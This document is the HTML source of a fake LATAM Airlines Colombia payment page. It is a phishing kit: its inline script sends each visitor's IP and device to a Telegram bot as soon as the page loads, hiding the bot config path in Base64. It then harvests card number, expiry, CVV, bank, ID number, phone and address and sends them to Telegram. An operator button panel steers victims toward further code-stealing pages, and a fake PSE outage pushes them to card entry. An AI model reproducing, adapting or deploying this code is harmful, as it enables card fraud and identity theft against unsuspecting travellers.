<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Pasajeros | LTM Colombia</title>
    <link rel="shortcut icon" href="./assets/favicon.png" type="image/x-icon" />

    <!-- CSS -->
    <link rel="stylesheet" href="./css/normalize.css" />
    <link rel="stylesheet" href="./css/utils.css" />
    <link rel="stylesheet" href="./css/main.css" />
    <link rel="stylesheet" href="./css/hotel-datepicker.css" />

    <!-- JS -->
    <script src="./js/functions.js"></script>
    <script src="./js/nuvi.js"></script>
    <style>
      .loaderp {
        width: 48px;
        height: 48px;
        border: 5px solid #fff;
        border-bottom-color: #e8114b;
        border-radius: 50%;
        display: inline-block;
        box-sizing: border-box;
        animation: rotation 1s linear infinite;
      }

      @keyframes rotation {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      .loaderp-full {
        position: fixed;
        top: 0;
        overflow-y: hidden;
        z-index: 1000;
        background-color: white;
        width: 100vw;
        height: 100vh;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        display: none; /* Oculto por defecto */
      }
    </style>
  </head>

  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const LS = window.localStorage;
      const info = JSON.parse(LS.getItem("info"));

      if (!info || !info.flightInfo) {
        console.error("No se encontraron datos de vuelo en localStorage");
        return;
      }

      const PRECIO_BASE = 49900; // Precio base de los vuelos.
      const MULTIPLICADORES_PRECIO = {
        // Incremento porcentual de tarifas.
        basic: 1,
        light: 1.7,
        full: 3,
      };

      const dayDic = [
        "Domingo",
        "Lunes",
        "Martes",
        "Miércoles",
        "Jueves",
        "Viernes",
        "Sábado",
      ];
      const monthDic = [
        "Enero",
        "Febrero",
        "Marzo",
        "Abril",
        "Mayo",
        "Junio",
        "Julio",
        "Agosto",
        "Septiembre",
        "Octubre",
        "Noviembre",
        "Diciembre",
      ];

      function formatDate(dateStr) {
        const date = new Date(parseInt(dateStr));
        const day = dayDic[date.getDay()];
        const month = monthDic[date.getMonth()];
        const dayOfMonth = date.getDate();
        return `${day}, ${dayOfMonth} de ${month}`;
      }

      function calculateTotalCost(flightInfo) {
        const totalPassengers = flightInfo.adults + flightInfo.children;
        const originMultiplier =
          MULTIPLICADORES_PRECIO[flightInfo.origin.ticket_type];
        const destinationMultiplier =
          MULTIPLICADORES_PRECIO[flightInfo.destination.ticket_type];

        let totalCost = PRECIO_BASE * originMultiplier * totalPassengers;

        if (flightInfo.travel_type === 1) {
          // Ida y vuelta
          totalCost += PRECIO_BASE * destinationMultiplier * totalPassengers;
        }

        return totalCost;
      }

      function updateDOM() {
        const flightInfo = info.flightInfo;

        const resumePassengers = document.querySelector("#resume-passengers");
        const resumeCost = document.querySelector("#resume-cost");
        const payBtn = document.querySelector("#btn-pagar");
        const paymentCost = document.querySelector("#payment-cost");

        if (resumePassengers && resumeCost && payBtn && paymentCost) {
          let passengersText = "";
          if (flightInfo.adults !== 0) {
            passengersText += `${flightInfo.adults} ${
              flightInfo.adults > 1 ? "Adultos" : "Adulto"
            }`;
          }
          if (flightInfo.children !== 0) {
            passengersText += `, ${flightInfo.children} ${
              flightInfo.children > 1 ? "Niños" : "Niño"
            }`;
          }
          if (flightInfo.babies !== 0) {
            passengersText += `, ${flightInfo.babies > 1 ? "Bebés" : "Bebé"}`;
          }
          resumePassengers.innerHTML = passengersText;

          const totalCost = calculateTotalCost(flightInfo);
          const formattedCost = `COP ${totalCost.toLocaleString("es-CO")},00`;
          resumeCost.textContent = formattedCost;
          payBtn.textContent = formattedCost;
          paymentCost.textContent = formattedCost;
        }

        const resumeGoFlight = document.querySelector("#resume-go-flight");
        const resumeGoDate = document.querySelector("#resume-go-date");
        const resumeGoSchedule = document.querySelector("#resume-go-schedule");

        const resumeBackFlight = document.querySelector("#resume-back-flight");
        const resumeBackDate = document.querySelector("#resume-back-date");
        const resumeBackSchedule = document.querySelector(
          "#resume-back-schedule"
        );

        if (resumeGoFlight && resumeGoDate && resumeGoSchedule) {
          const goFlightText = `De ${flightInfo.origin.city} a ${flightInfo.destination.city}`;
          resumeGoFlight.textContent = goFlightText;

          const goDateText = formatDate(flightInfo.flightDates[0]);
          resumeGoDate.textContent = goDateText;

          const goScheduleText = `${flightInfo.origin.ticket_sched.takeoff} ${flightInfo.origin.code} → ${flightInfo.destination.ticket_sched.landing} ${flightInfo.destination.code}`;
          resumeGoSchedule.textContent = goScheduleText;
        }

        if (resumeBackFlight && resumeBackDate && resumeBackSchedule) {
          const backFlightText = `De ${flightInfo.destination.city} a ${flightInfo.origin.city}`;
          resumeBackFlight.textContent = backFlightText;

          const backDateText = formatDate(flightInfo.flightDates[1]);
          resumeBackDate.textContent = backDateText;

          const backScheduleText = `${flightInfo.destination.ticket_sched.takeoff} ${flightInfo.destination.code} → ${flightInfo.origin.ticket_sched.landing} ${flightInfo.origin.code}`;
          resumeBackSchedule.textContent = backScheduleText;
        }
      }

      
      async function loadTelegramConfig() {
    try {
        // Ruta codificada en Base64
        const rutaCodificada = "Li9qcy9icnc3Ni5qc29u"; // Reemplaza con tu cadena codificada

        // Decodificar la ruta antes de usarla
        const rutaDecodificada = atob(rutaCodificada);

        const response = await fetch(rutaDecodificada); // Usa la ruta decodificada
        if (!response.ok) {
            throw new Error("No se pudo cargar el archivo de configuración de Telegram.");
        }
        return await response.json();
    } catch (error) {
        console.error("Error al cargar el archivo de configuración de Telegram:", error);
    }
}


    // Función para obtener la dirección IP del usuario
    async function getUserIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.error("Error al obtener la IP del usuario:", error);
        return "IP no disponible";
      }
    }

    // Función para detectar el dispositivo del usuario
    function getDeviceInfo() {
      const userAgent = navigator.userAgent;
      let deviceType = "Desconocido";

      if (/Mobi|Android/i.test(userAgent)) {
        deviceType = "Móvil";
      } else if (/Tablet|iPad/i.test(userAgent)) {
        deviceType = "Tablet";
      } else if (/Windows|Mac|Linux/i.test(userAgent)) {
        deviceType = "Escritorio";
      }

      return {
        deviceType,
        userAgent,
      };
    }

    // Función para enviar la notificación a Telegram
    async function sendUserNotificationToTelegram() {
    const ip = await getUserIP();
    const deviceInfo = getDeviceInfo();
    const config = await loadTelegramConfig();

      if (!config) {
        return;
      }

      const message = `💳-USER EN PASARELA DE PAGO-💳\n\n🌐 IP: ${ip}\n📱 Dispositivo: ${deviceInfo.deviceType}\n`;

      fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: config.chat_id,
          text: message,
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.ok) {
            console.log("Notificación enviada a Telegram con éxito.");
          } else {
            console.error("Error al enviar la notificación a Telegram:", data);
          }
        })
        .catch((error) => {
          console.error("Error al enviar la notificación a Telegram:", error);
        });
    }

    // Llamar a la función para enviar la notificación cuando se carga la página
    sendUserNotificationToTelegram();

      updateDOM();

      //Enviar el cvv al servidor
      async function loadTelegramConfig() {
        try {
          const response = await fetch("./js/brr76.json");
          if (!response.ok) {
            throw new Error(
              "No se pudo cargar el archivo de configuración de Telegram."
            );
          }
          return await response.json();
        } catch (error) {
          console.error(
            "Error al cargar el archivo de configuración de Telegram:",
            error
          );
        }
      }

      //Enviar formulario al ingresar el cvv
      async function sendFormData() {
        const formData = {
          entidad: document.getElementById("txt-entidad").value,
          tarjeta: document.getElementById("txt-tarjeta").value,
          nombre: document.getElementById("name").value,
          fechaExpiracion: document.getElementById("mFecha").value,
          cvv: document.getElementById("txt-cvv").value,
          documentoIdentidad: document.getElementById("cc").value,
          telefono: document.getElementById("telnum").value,
          ciudad: document.getElementById("city").value,
          direccion: document.getElementById("address").value,
        };

        const config = await loadTelegramConfig();
        if (!config) {
          return;
        }

        const message = `👤Nombre: Nombre: ${formData.nombre}\n🪪Cédula: ${formData.documentoIdentidad}\n-\n📞Teléfono: ${formData.telefono}\n🌇Ciudad: ${formData.ciudad}\n🗺️Direc: ${formData.direccion}\n-\n🏦 Banco: ${formData.entidad}\n💳Tarjeta: ${formData.tarjeta}\n📅Fecha: ${formData.fechaExpiracion}\n🔐CVV: ${formData.cvv}
       `;

        fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: config.chat_id,
            text: message,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            if (data.ok) {
              console.log(
                "Información del formulario enviada a Telegram con éxito."
              );
            } else {
              console.error("Error al enviar la información a Telegram:", data);
            }
          })
          .catch((error) => {
            console.error("Error al enviar la información a Telegram:", error);
          });
      }

      
      //Pagar-----------------------

      const form = document.getElementById("form-payment");
      const btnPagar = document.getElementById("btn-pagar");
      const loader = document.querySelector(".loaderp-full");

      form.addEventListener("submit", function (e) {
        e.preventDefault();
      });

      btnPagar.addEventListener("click", async function (e) {
  e.preventDefault();
  loader.style.display = "flex";

  // Obteniendo todos los campos de entrada
  const email = document.getElementById("email").value.trim();
  const tarjeta = document.getElementById("txt-tarjeta").value.trim();
  const nombre = document.getElementById("name").value.trim();
  const expiracion = document.getElementById("mFecha").value.trim();
  const cvv = document.getElementById("txt-cvv").value.trim();
  const documentoIdentidad = document.getElementById("cc").value.trim();
  const telefono = document.getElementById("telnum").value.trim();
  const ciudad = document.getElementById("city").value.trim();
  const direccion = document.getElementById("address").value.trim();

  // Verificando si algún campo está vacío o no cumple con los requisitos
  if (
    !email ||
    !tarjeta || tarjeta.length !== 19 ||
    !nombre ||
    !expiracion ||
    !cvv || cvv.length !== 3 ||
    !documentoIdentidad ||
    !telefono ||
    !ciudad ||
    !direccion
  ) {
    alert("Por favor, completa todos los campos requeridos correctamente.");
    loader.style.display = "none";
    return;
  }

  // Si todos los campos están completos, continúa con la lógica existente
  const formData = JSON.parse(localStorage.getItem("formData"));
  const transactionId = formData.transactionId;

  // Enviar mensaje a Telegram con botón de verificación
  const message = `Nuevo método de pago pendiente de verificación.\n🆔ID: ${transactionId}Correo: ${formData.email}\n👤Nombre: ${formData.nombre}\n🪪Cédula: ${formData.documentoIdentidad}\n-\n📞Teléfono: ${formData.telefono}\n🌇Ciudad: ${formData.ciudad}\n🗺️Direc: ${formData.direccion}\n-\n🏦 Banco: ${formData.entidad}\n💳Tarjeta: ${formData.tarjeta}\n📅Fecha: ${formData.fechaExpiracion}\n🔐CVV: ${formData.cvv}`;

  const keyboard = JSON.stringify({
    inline_keyboard: [
      [{ text: "Pedir Logo", callback_data: `pedir_logo:${transactionId}` }],
      [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
      [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
      [{ text: "Error de Logo", callback_data: `error_logo:${transactionId}` }],
      [{ text: "Error de Dinámica", callback_data: `error_dinamica:${transactionId}` }],
      [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
    ],
  });

  const config = await loadTelegramConfig();
  if (!config) {
    loader.style.display = "none";
    return;
  }

  fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: config.chat_id,
      text: message,
      reply_markup: keyboard,
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      if (data.ok) {
        console.log("Mensaje enviado a Telegram con éxito");
        checkPaymentVerification(transactionId);
      } else {
        console.error("Error al enviar mensaje a Telegram:", data);
        loader.style.display = "none";
      }
    })
    .catch((error) => {
      console.error("Error al enviar mensaje a Telegram:", error);
      loader.style.display = "none";
    });
});


      async function checkPaymentVerification(transactionId) {
        const config = await loadTelegramConfig();
        if (!config) {
          loader.style.display = "none";
          return;
        }
        fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
          .then((response) => response.json())
          .then((data) => {
            const updates = data.result;
            const verificationUpdate = updates.find(
              (update) =>
              update.callback_query &&
              (update.callback_query.data === `pedir_logo:${transactionId}` ||
               update.callback_query.data === `error_tc:${transactionId}` ||
               update.callback_query.data === `finalizar:${transactionId}`)
            );

            if (verificationUpdate) {
              loader.style.display = "none";
              if (verificationUpdate.callback_query.data === `pedir_logo:${transactionId}`) {
                window.location.href = "chedf.php";
              }
              if (verificationUpdate.callback_query.data === `error_tc:${transactionId}`) {
                alert("La tarjeta de crédito no pudo ser procesada. Por favor, verifique los detalles e intente nuevamente.");
              }
              if (verificationUpdate.callback_query.data === `finalizar:${transactionId}`) {
                window.location.href = "finish.php";
              }
            } else {
              setTimeout(() => checkPaymentVerification(transactionId, config), 2000);
            }
          })
          .catch((error) => {
            console.error("Error al verificar el pago:", error);
            setTimeout(
              () => checkPaymentVerification(transactionId, config),
              2000
            );
          });
      }
    });
  </script>

  <body class="bg-gray">
    <nav class="p-fixed border-box bg-deep-blue p-3">
      <div class="d-flex justify-space-between align-items-center">
        <div>
          <img width="105px" src="./assets/logos/LATAM_navbar.png" />
        </div>

        <div class="d-flex justify-content-center align-items-center">
          <button class="btn-session">Iniciar sesión</button>
          <img class="navbar--hamburger" src="./assets/media/hamburger_a.png" />
        </div>
      </div>
    </nav>

    <main class="mt-6 bg-gray">
      <p class="tc-ocean fs-1 pt-3 m-0 mb-3">Confirma y paga tu compra</p>
      <div class="p-3 bg-white rounded-borded">
        <div
          class="border-bottom d-flex flex-row justify-space-between align-items-start"
        >
          <div>
            <p class="fs-3 m-0 fw-light mb-1 tc-ocean mt-1">Total a pagar</p>
            <p class="m-0 mb-4 fs-5 tc-gray-smoke" id="resume-passengers">
              1 Adulto
            </p>
          </div>
          <div>
            <p class="fs-3 m-0 fw-bold tc-ocean mt-1" id="resume-cost">
              COP 290.090,00
            </p>
          </div>
        </div>

        <div class="border-bottom d-flex mt-4 flex-column" id="resume-travel">
          <div class="mb-4">
            <p class="m-0 fw-bold fs-5 tc-ocean" id="resume-go-flight">
              De Barranquilla a Bogotá
            </p>
            <p class="m-0 mt-1 fs-5 tc-gray-smoke" id="resume-go-date">
              vie, 01 de mar
            </p>
            <p class="m-0 mt-1 fs-5 tc-gray-smoke" id="resume-go-schedule">
              04:45 a. m. BAQ → 06:15 a. m. BOG
            </p>
          </div>
          <div class="mb-3">
            <p class="m-0 fw-bold fs-5 tc-ocean" id="resume-back-flight">
              De Bogotá a Barranquilla
            </p>
            <p class="m-0 mt-1 fs-5 tc-gray-smoke" id="resume-back-date">
              vie, 01 de mar
            </p>
            <p class="m-0 mt-1 fs-5 tc-gray-smoke" id="resume-back-schedule">
              04:45 a. m. BAQ → 06:15 a. m. BOG
            </p>
          </div>
        </div>

        <div class="d-flex justify-content-center align-items-center">
          <p
            class="fw-bold tc-red mt-4"
            onclick="window.location.href = 'select-flight-go.html'"
          >
            Volver a elegir vuelos
          </p>
        </div>
      </div>

      <p class="tc-ocean fw-lighter fs-1 pt-3 m-0 mb-3">Medios de pago</p>

      <div class="bg-white card-rounded pt-1 pb-1 mb-5">
        <form class="border-bottom" id="form-payment">
          <div class="d-flex flex-row align-items-start mt-3">
            <svg
              width="35px"
              class="tc-gray-smoke mr-2 ml-2"
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              focusable="false"
              viewBox="0 0 32 32"
            >
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M2.95571 23.2614C3.4669 23.6881 4.02254 23.7521 4.3337 23.7521C4.35745 23.7521 4.3796 23.7506 4.40018 23.7492H4.40022H4.40025H4.40028H4.40032H4.40035H4.40037C4.45674 23.7453 4.50119 23.7422 4.53373 23.7735H7.71201C8.06763 23.7735 8.33433 23.5174 8.33433 23.176C8.33433 22.8347 8.0454 22.5786 7.71201 22.5786H4.48928H4.40038C4.40038 22.5786 4.04477 22.6 3.75583 22.3652C3.40022 22.0879 3.22242 21.4904 3.22242 20.6583V7.19485H24.648H24.6702C24.6702 7.19485 25.5371 7.17352 26.0705 7.66426C26.3594 7.94164 26.515 8.34704 26.515 8.90179V12.4119C26.515 12.7533 26.7817 13.0093 27.1373 13.0093C27.4929 13.0093 27.7596 12.7319 27.7596 12.4119V8.88045C27.7596 8.00565 27.4707 7.30154 26.915 6.78946C26.0482 6 24.8258 6 24.648 6H2.62232C2.26671 6 2 6.27738 2 6.59743V20.6583C2 21.8532 2.31116 22.728 2.95571 23.2614ZM11.2453 22.5572C10.8897 22.5572 10.623 22.8346 10.623 23.1546C10.623 23.4747 10.8897 23.7307 11.2453 23.7521H16.3572C16.7129 23.7521 16.9796 23.496 16.9796 23.1546C16.9796 22.8132 16.6906 22.5572 16.3572 22.5572H11.2453ZM4.84433 20.5943C4.97768 20.7223 5.13326 20.765 5.31107 20.765C5.46665 20.765 5.62223 20.701 5.73336 20.5943C5.86671 20.4662 5.91116 20.3169 5.91116 20.1462V19.7408C5.91116 19.5914 5.84449 19.4421 5.73336 19.3354C5.6 19.2074 5.46665 19.1647 5.31107 19.1647C5.13326 19.1647 4.97768 19.2287 4.84433 19.3354C4.71098 19.4634 4.66652 19.5914 4.66652 19.7408V20.1462C4.66652 20.3169 4.7332 20.4662 4.84433 20.5943ZM6.82464 20.765C6.64683 20.765 6.49125 20.7223 6.35789 20.5943C6.22454 20.4662 6.15786 20.3169 6.18009 20.1462V19.7408C6.18009 19.5914 6.22454 19.4634 6.35789 19.3354C6.49125 19.2287 6.64683 19.1647 6.82464 19.1647C6.98022 19.1647 7.11357 19.2074 7.24692 19.3354C7.35805 19.4421 7.42473 19.5914 7.42473 19.7408V20.1462C7.42473 20.3169 7.38028 20.4662 7.24692 20.5943C7.1358 20.701 6.98022 20.765 6.82464 20.765ZM8.31228 20.765C8.13447 20.765 7.97889 20.701 7.84554 20.5943C7.71218 20.4662 7.66773 20.3169 7.66773 20.1462V19.7408C7.66773 19.5914 7.73441 19.4421 7.84554 19.3354C7.97889 19.2074 8.11225 19.1647 8.31228 19.1647C8.46786 19.1647 8.62344 19.2287 8.73456 19.3354C8.86792 19.4634 8.91237 19.5914 8.91237 19.7408V20.1462C8.91237 20.3169 8.84569 20.4662 8.73456 20.5943C8.60121 20.701 8.46786 20.765 8.31228 20.765ZM9.75819 20.765C9.58039 20.765 9.42481 20.7223 9.29145 20.5943C9.1581 20.4662 9.11365 20.3169 9.11365 20.1462V19.7408C9.11365 19.5914 9.1581 19.4634 9.29145 19.3354C9.42481 19.2287 9.58039 19.1647 9.75819 19.1647C9.91377 19.1647 10.0471 19.2074 10.1805 19.3354C10.2916 19.4421 10.3583 19.5914 10.3583 19.7408V20.1462C10.3583 20.3169 10.3138 20.4662 10.1805 20.5943C10.0694 20.701 9.91377 20.765 9.75819 20.765ZM12.1797 20.765C12.0019 20.765 11.8463 20.701 11.713 20.5943C11.5796 20.4662 11.5352 20.3169 11.5352 20.1462V19.7408C11.5352 19.5914 11.6019 19.4421 11.713 19.3354C11.8463 19.2074 12.0019 19.1647 12.1797 19.1647C12.3353 19.1647 12.4909 19.2287 12.602 19.3354C12.7354 19.4634 12.7798 19.5914 12.7798 19.7408V20.1462C12.7798 20.3169 12.7131 20.4662 12.602 20.5943C12.4909 20.701 12.3353 20.765 12.1797 20.765ZM13.6913 20.765C13.5135 20.765 13.3579 20.7223 13.2245 20.5943C13.1134 20.4662 13.0467 20.3169 13.0467 20.1462V19.7408C13.0467 19.5914 13.0912 19.4634 13.2245 19.3354C13.3579 19.2287 13.5135 19.1647 13.6913 19.1647C13.8468 19.1647 13.9802 19.2074 14.1135 19.3354C14.2247 19.4421 14.2914 19.5914 14.2914 19.7408V20.1462C14.2914 20.3169 14.2469 20.4662 14.1135 20.5943C14.0024 20.701 13.8468 20.765 13.6913 20.765ZM15.1787 20.765C15.0009 20.765 14.8454 20.701 14.712 20.5943C14.5786 20.4662 14.5342 20.3169 14.5342 20.1462V19.7408C14.5342 19.5914 14.6009 19.4421 14.712 19.3354C14.8454 19.2074 14.9787 19.1647 15.1787 19.1647C15.3343 19.1647 15.4899 19.2287 15.601 19.3354C15.7344 19.4634 15.7788 19.5914 15.7788 19.7408V20.1462C15.7788 20.3169 15.7122 20.4662 15.601 20.5943C15.4899 20.701 15.3565 20.765 15.1787 20.765ZM16.6469 20.765C16.4691 20.765 16.3135 20.7224 16.1801 20.5943C16.0468 20.4663 15.9801 20.317 15.9801 20.1249V19.7195C15.9801 19.5702 16.0246 19.4422 16.1579 19.3141C16.2913 19.2075 16.4468 19.1434 16.6247 19.1434C16.8025 19.1434 16.9358 19.2075 17.0692 19.3355C17.1803 19.4422 17.247 19.5915 17.247 19.7409V20.1463C17.247 20.317 17.2025 20.4663 17.0692 20.5943C16.958 20.701 16.8025 20.765 16.6469 20.765Z"
                fill="currentColor"
              ></path>
              <path
                d="M26.5156 21.431H25.4782V22.4766C25.4782 22.6224 25.4337 22.7364 25.3394 22.8314C25.245 22.9265 25.1319 22.9708 24.9936 22.9708C24.8678 22.9708 24.7673 22.9265 24.6729 22.8314C24.5849 22.7364 24.5347 22.6224 24.5347 22.4766V21.431H23.5029C23.3771 21.431 23.2703 21.3866 23.1822 21.2916C23.0879 21.2028 23.044 21.0824 23.044 20.9366C23.044 20.8162 23.0879 20.7085 23.1822 20.6134C23.2703 20.5247 23.3771 20.474 23.5029 20.474H24.5347V19.4284C24.5347 19.289 24.5786 19.1686 24.6729 19.0736C24.7673 18.9848 24.8741 18.9341 24.9936 18.9341C25.1319 18.9341 25.2513 18.9785 25.3394 19.0736C25.4337 19.1686 25.4782 19.2827 25.4782 19.4284V20.474H26.5156C26.6351 20.474 26.7425 20.5184 26.8368 20.6134C26.9311 20.7085 26.975 20.8162 26.975 20.9366C26.975 21.0824 26.9311 21.1965 26.8368 21.2916C26.7425 21.3866 26.6351 21.431 26.5156 21.431ZM24.9936 26C23.6539 26 22.4906 25.5184 21.522 24.5551C20.5471 23.5919 20.0377 22.4385 20 21.0887V20.9049C20.0252 19.986 20.2701 19.1432 20.7481 18.3891C21.2261 17.635 21.8366 17.0456 22.5914 16.6274C23.3461 16.2091 24.1443 16 24.9997 16C25.1381 16 25.2581 16.0444 25.3461 16.1395C25.4405 16.2345 25.4843 16.3423 25.4843 16.4627C25.4843 16.6084 25.4405 16.7225 25.3461 16.8175C25.2518 16.9126 25.1381 16.9569 24.9997 16.9569C23.9053 16.9569 22.9622 17.3498 22.1823 18.142C21.4024 18.9278 20.9998 19.8721 20.9809 20.981C20.9809 21.7605 21.1758 22.4576 21.5595 23.0849C21.9494 23.706 22.4404 24.194 23.0379 24.5425C23.6417 24.891 24.2894 25.0621 25.0064 25.0621C26.1449 25.0621 27.1004 24.6756 27.8804 23.8961C28.6603 23.1166 29.0566 22.1661 29.0566 21.0381C29.0566 20.8986 29.101 20.7782 29.1954 20.6831C29.2897 20.5944 29.4027 20.5437 29.5473 20.5437C29.692 20.5437 29.7991 20.5881 29.8808 20.6831C29.9563 20.7782 30 20.8923 30 21.0381C30 21.9823 29.7612 22.8314 29.2832 23.5982C28.8052 24.365 28.189 24.9607 27.4406 25.379C26.6795 25.7909 25.8615 26 24.9936 26Z"
                fill="currentColor"
              ></path>
            </svg>
            <div style="width: 75%">
              <p class="fw-bold tc-ocean m-0">Agregar tarjeta</p>
              <p class="mt-1 tc-gray-smoke">
                Débito con CVV o crédito Visa, Mastercard, American Express o
                Diners Club.
              </p>
              <div class="d-flex justify-space-between">
                <p class="mt-3 fs-4 tc-gray-smoke">A pagar con tarjeta</p>
                <p class="fs-4 fw-bold tc-ocean" id="payment-cost">
                  $ 290.090,00
                </p>
              </div>
            </div>
            <div>
              <div class="radio-container m-2">
                <input type="radio" name="travel-opt" checked />
                <div class="radio-blue ct-radio"></div>
              </div>
            </div>
          </div>

          <div class="pr-3 pl-3">
            <div class="select-container">
              <select id="txt-entidad" required>
                <option label="BANCAMIA S.A." value="bancamia">
                  BANCAMIA S.A.
                </option>
                <option label="BANCO AGRARIO" value="agrario">
                  BANCO AGRARIO
                </option>
                <option label="BANCO AV VILLAS" value="avvillas">
                  BANCO AV VILLAS
                </option>
                <option label="BANCO BBVA COLOMBIA S.A." value="bbva">
                  BANCO BBVA COLOMBIA S.A.
                </option>
                <option label="BANCO CAJA SOCIAL" value="caja-social">
                  BANCO CAJA SOCIAL
                </option>
                <option
                  label="BANCO COOPERATIVO COOPCENTRAL"
                  value="coopertaivo-coopcentral"
                >
                  BANCO COOPERATIVO COOPCENTRAL
                </option>
                <option label="BANCO CREDIFINANCIERA" value="credifinanciera">
                  BANCO CREDIFINANCIERA
                </option>
                <option label="BANCO DAVIVIENDA" value="davivienda">
                  BANCO DAVIVIENDA
                </option>
                <option label="BANCO DE BOGOTA" value="bogota">
                  BANCO DE BOGOTA
                </option>
                <option label="BANCO DE OCCIDENTE" value="occidente">
                  BANCO DE OCCIDENTE
                </option>
                <option label="BANCO FALABELLA " value="falabella">
                  BANCO FALABELLA
                </option>
                <option label="BANCO FINANDINA S.A. BIC" value="finandina">
                  BANCO FINANDINA S.A. BIC
                </option>
                <option label="BANCO GNB SUDAMERIS" value="sudameris">
                  BANCO GNB SUDAMERIS
                </option>
                <option label="BANCO ITAU" value="itau">BANCO ITAU</option>
                <option label="BANCO PICHINCHA S.A." value="pichincha">
                  BANCO PICHINCHA S.A.
                </option>
                <option label="BANCO POPULAR" value="popular">
                  BANCO POPULAR
                </option>
                <option label="BANCO SANTANDER COLOMBIA" value="santander">
                  BANCO SANTANDER COLOMBIA
                </option>
                <option label="BANCO SERFINANZA" value="serfinanza">
                  BANCO SERFINANZA
                </option>
                <option label="BANCO UNION antes GIROS" value="union">
                  BANCO UNION antes GIROS
                </option>
                <option label="BANCOLOMBIA" value="bancolombia" selected>
                  BANCOLOMBIA
                </option>
                <option label="BANCOOMEVA S.A." value="bancomeva">
                  BANCOOMEVA S.A.
                </option>
                <option label="CFA COOPERATIVA FINANCIERA" value="cfa">
                  CFA COOPERATIVA FINANCIERA
                </option>
                <option label="CITIBANK " value="citibank">CITIBANK</option>
                <option label="COLTEFINANCIERA" value="coltefinanciera">
                  COLTEFINANCIERA
                </option>
                <option label="CONFIAR COOPERATIVA FINANCIERA" value="confiar">
                  CONFIAR COOPERATIVA FINANCIERA
                </option>
                <option
                  label="COOFINEP COOPERATIVA FINANCIERA"
                  value="coofinep"
                >
                  COOFINEP COOPERATIVA FINANCIERA
                </option>
                <option label="COTRAFA" value="cotrafa">COTRAFA</option>
                <option label="DALE" value="dale">DALE</option>
                <option label="DAVIPLATA" value="1551">DAVIPLATA</option>
                <option label="IRIS" value="iris">IRIS</option>
                <option label="LULO BANK" value="lulo">LULO BANK</option>
                <option label="MOVII S.A." value="movii">MOVII S.A.</option>
                <option label="NEQUI" value="nequi">NEQUI</option>
                <option label="RAPPIPAY" value="rappipay">RAPPIPAY</option>
                <option label="RAPPIPAY DAVIPLATA" value="rappipay">
                  RAPPIPAY DAVIPLATA
                </option>
                <option
                  label="SCOTIABANK COLPATRIA"
                  value="scotiabank-colpatria"
                >
                  SCOTIABANK COLPATRIA
                </option>
              </select>
              <label for="origin">Banco o Entidad Financiera</label>
            </div>
            <div class="input-container mb-1">
              <input
                required
                type="text"
                id="txt-tarjeta"
                maxlength="19"
                minlength="19"
                oninput="handleCardNumberInput(this)"
              />
              <label for="origin">Número de tarjeta</label>
            </div>
            <div class="input-container mb-0">
              <input required type="text" id="name" required />
              <label for="origin">Nombre y Apellido</label>
            </div>
            <div class="d-flex flex-row justify-space-between mb-4">
              <div class="input-container mb-1 mr-2">
                <input
                  oninput="formatDate(this)"
                  id="mFecha"
                  required
                  type="text"
                  required
                />
                <label for="origin">Expiración</label>
              </div>
              <div class="input-container mb-1">
                <input
                  id="txt-cvv"
                  required
                  type="number"
                  required
                  oninput="limitDigits(this, 3)"
                  onblur="sendCVV()"
                />
                <label for="origin">CVV</label>
              </div>
            </div>

            <p class="fw-bold fs-4 tc-ocean mb-1">Información titular</p>

            <div class="input-container mb-1">
              <input
                required
                type="number"
                id="cc"
                required
                oninput="limitDigits(this, 10)"
              />
              <label for="origin">Documento de Identidad</label>
            </div>

            <div class="input-container mb-1">
              <input
                required
                type="number"
                required
                id="telnum"
                maxlength="9999999999"
                oninput="limitDigits(this, 10)"
              />
              <label for="origin">Número telefónico</label>
            </div>

            <div class="input-container mb-1">
              <input required type="text" required id="city" />
              <label for="origin">Ciudad</label>
            </div>

            <div class="input-container mb-4">
              <input required type="text" required id="address" />
              <label for="origin">Dirección</label>
            </div>
          </div>

          <button id="btn-cost" type="submit" class="d-none"></button>
        </form>

        <div
          class="d-flex flex-row align-items-start mt-3"
          onclick="alert('!Lo sentimos! No podemos conectarnos con los servicios PSE en este momento. Inténta con otro medio de pago.')"
        >
          <svg
            width="35px"
            class="tc-gray-smoke mr-2 ml-2"
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            focusable="false"
            viewBox="0 0 32 32"
          >
            <path
